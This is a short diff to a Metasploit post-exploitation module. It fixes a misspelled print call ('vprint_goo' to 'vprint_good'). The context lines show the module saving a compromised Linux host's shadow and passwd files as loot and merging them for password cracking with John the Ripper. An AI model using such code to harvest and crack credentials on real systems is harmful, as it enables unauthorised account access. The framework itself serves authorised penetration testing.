@@ -28,7 +28,7 @@ class MetasploitModule < Msf::Post
       p1 = store_loot("linux.shadow", "text/plain", session, shadow_file, "shadow.tx", "Linux Password Shadow File")
       p2 = store_loot("linux.passwd", "text/plain", session, passwd_file, "passwd.tx", "Linux Passwd File")
       vprint_good("Shadow saved in: #{p1.to_s}")
-      vprint_goo("passwd saved in: #{p2.to_s}")
+      vprint_good("passwd saved in: #{p2.to_s}")
 
       # Unshadow the files
       john_file = unshadow(passwd_file, shadow_file)
